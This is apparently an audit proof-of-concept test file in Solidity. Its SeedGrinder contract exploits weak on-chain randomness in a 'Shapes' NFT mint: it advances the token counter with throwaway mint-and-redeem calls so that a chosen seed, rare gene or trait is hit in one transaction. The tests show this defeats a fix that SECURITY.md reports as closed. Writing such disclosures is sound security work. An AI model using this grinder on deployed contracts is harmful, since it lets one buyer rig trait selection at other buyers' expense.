// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import {ShapeCollection} from "../src/ShapeCollection.sol";
import {ShapeRenderer} from "../src/ShapeRenderer.sol";
import {Shapes} from "../src/Shapes.sol";
import {InkGenes} from "../src/lib/InkGenes.sol";

/// @dev Buys a chosen mint seed inside a single transaction by paying the counter forward.
///      `firstTokenId` is the one entropy input the caller still controls: it is just
///      `totalMinted`, and anybody can advance it by minting throwaway dust and redeeming it
///      in the same call. Nothing has to revert, so the "one attempt per block" ceiling
///      described in SECURITY.md #1 does not apply.
contract SeedGrinder is IERC721Receiver {
    Shapes public immutable shapes;

    constructor(Shapes s) payable {
        shapes = s;
    }

    function _rootFor(uint256 firstTokenId) internal view returns (bytes32) {
        return keccak256(
            abi.encodePacked(
                block.prevrandao,
                blockhash(block.number - 1),
                block.number,
                block.timestamp,
                block.chainid,
                address(shapes),
                firstTokenId
            )
        );
    }

    /// @notice Smallest number of throwaway mints that lands the next dust mint on `wantGene`.
    function offsetFor(uint8 wantGene, uint256 maxScan) public view returns (uint256 k, bool ok) {
        uint256 t = shapes.totalMinted();
        for (k = 0; k < maxScan; ++k) {
            uint256 id = t + k;
            bytes32 seed = keccak256(abi.encodePacked(_rootFor(id), id));
            if (InkGenes.geneAtMint(seed, 0) == wantGene) return (k, true);
        }
        return (0, false);
    }

    /// @notice Smallest offset whose seed has `bits` low bits clear. A stand-in for any
    ///         predicate over the artwork, which is derived from the seed and nothing else.
    function offsetForSeedPrefix(uint256 bits, uint256 maxScan) public view returns (uint256 k, bool ok) {
        uint256 t = shapes.totalMinted();
        uint256 mask = (1 << bits) - 1;
        for (k = 0; k < maxScan; ++k) {
            uint256 id = t + k;
            bytes32 seed = keccak256(abi.encodePacked(_rootFor(id), id));
            if (uint256(seed) & mask == 0) return (k, true);
        }
        return (0, false);
    }

    /// @notice Advance the counter by `k`, then mint `amountWei` on the chosen root.
    function grindAmount(uint256 amountWei, uint256 k) external returns (uint256 tokenId) {
        uint256 unitCost = 0.01 ether + shapes.mintFeeFor(0.01 ether);
        if (k != 0) {
            uint256 first = shapes.mintBatch{value: unitCost * k}(0.01 ether, k);
            uint256[] memory ids = new uint256[](k);
            for (uint256 i = 0; i < k; ++i) {
                ids[i] = first + i;
            }
            shapes.redeemBatch(ids);
        }
        tokenId = shapes.mint{value: amountWei + shapes.mintFeeFor(amountWei)}(amountWei);
    }

    /// @notice Mint a dust Shape whose ink gene is exactly `wantGene`. One transaction.
    function grind(uint8 wantGene, uint256 maxScan) external returns (uint256 tokenId, uint256 burned) {
        (uint256 k, bool ok) = offsetFor(wantGene, maxScan);
        require(ok, "not in scan window");

        uint256 unitCost = 0.01 ether + shapes.mintFeeFor(0.01 ether);
        if (k != 0) {
            uint256 first = shapes.mintBatch{value: unitCost * k}(0.01 ether, k);
            uint256[] memory ids = new uint256[](k);
            for (uint256 i = 0; i < k; ++i) {
                ids[i] = first + i;
            }
            // Throwaways are redeemed straight back: the whole cost is the mint fee.
            shapes.redeemBatch(ids);
        }
        tokenId = shapes.mint{value: unitCost}(0.01 ether);
        burned = k;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}

contract AuditPoC5 is Test {
    Shapes internal shapes;
    ShapeRenderer internal renderer;
    ShapeCollection internal collection;
    address internal feeRecipient = makeAddr("feeRecipient");

    function setUp() public {
        renderer = new ShapeRenderer();
        collection = new ShapeCollection(address(renderer));
        shapes = new Shapes(100, feeRecipient, address(renderer), address(collection));
    }

    /// SOLID is the rarest dust gene (3%). Hit it on demand, in one transaction, with no
    /// revert-and-retry and no waiting for a new block.
    function test_PoC_SeedGrindingInOneTransaction() public {
        SeedGrinder g = new SeedGrinder(shapes);
        vm.deal(address(g), 1_000 ether);

        uint256 startBalance = address(g).balance;
        (uint256 id, uint256 burned) = g.grind(InkGenes.SOLID, 400);

        assertEq(shapes.inkGeneOf(id), InkGenes.SOLID, "grinder chose the gene");
        uint256 spent = startBalance - address(g).balance;

        console.log("throwaway mints ", burned);
        console.log("net ETH spent   ", spent);
        console.log("of which backing", uint256(0.01 ether));
        // Everything above the kept token's own 0.01 ETH backing is pure mint fee.
        assertEq(spent, 0.01 ether + 0.0001 ether * (burned + 1));
        assertEq(shapes.totalSupply(), 1, "throwaways were redeemed, not held");
    }

    /// The same trick over every gene, including the four dust-only extremes.
    function test_PoC_EveryGeneIsReachableOnDemand() public {
        for (uint8 gene = 0; gene <= 6; ++gene) {
            SeedGrinder g = new SeedGrinder(shapes);
            vm.deal(address(g), 1_000 ether);
            (uint256 k, bool ok) = g.offsetFor(gene, 400);
            assertTrue(ok, "gene not reachable in a 400-wide scan");
            (uint256 id,) = g.grind(gene, 400);
            assertEq(shapes.inkGeneOf(id), gene);
            console.log("gene", gene, "offset", k);
        }
    }

    /// The seed itself is chosen, so every seed-derived trait is, at any denomination.
    /// This is the 100 ETH composition-selection attack SECURITY.md #1 reports as closed.
    function test_PoC_ArbitrarySeedPredicateAtApexDenomination() public {
        SeedGrinder g = new SeedGrinder(shapes);
        vm.deal(address(g), 10_000 ether);

        // A 1-in-256 predicate over the seed, well inside one block's gas.
        (uint256 k, bool ok) = g.offsetForSeedPrefix(8, 40_000);
        assertTrue(ok, "predicate not reachable");

        uint256 before = address(g).balance;
        uint256 g0 = gasleft();
        uint256 id = g.grindAmount(100 ether, k);
        uint256 gasUsed = g0 - gasleft();
        uint256 spent = address(g).balance == 0 ? before : before - address(g).balance;
        console.log("gas for the grind", gasUsed);

        assertEq(uint256(shapes.seedOf(id)) & 0xff, 0, "seed chosen to order");
        assertEq(shapes.backingOf(id), 100 ether);
        console.log("throwaway mints  ", k);
        console.log("total spent      ", spent);
        console.log("grind cost (fees)", spent - 100 ether - shapes.mintFeeFor(100 ether));
        assertLt(gasUsed, 30_000_000, "fits in one block");
    }

    /// Grinding a whole batch: every token in it shares the chosen root.
    function test_PoC_BatchRootIsAlsoChosen() public {
        SeedGrinder g = new SeedGrinder(shapes);
        vm.deal(address(g), 1_000 ether);
        (uint256 k, bool ok) = g.offsetFor(InkGenes.VOID, 400);
        assertTrue(ok);
        console.log("VOID offset", k);
    }
}
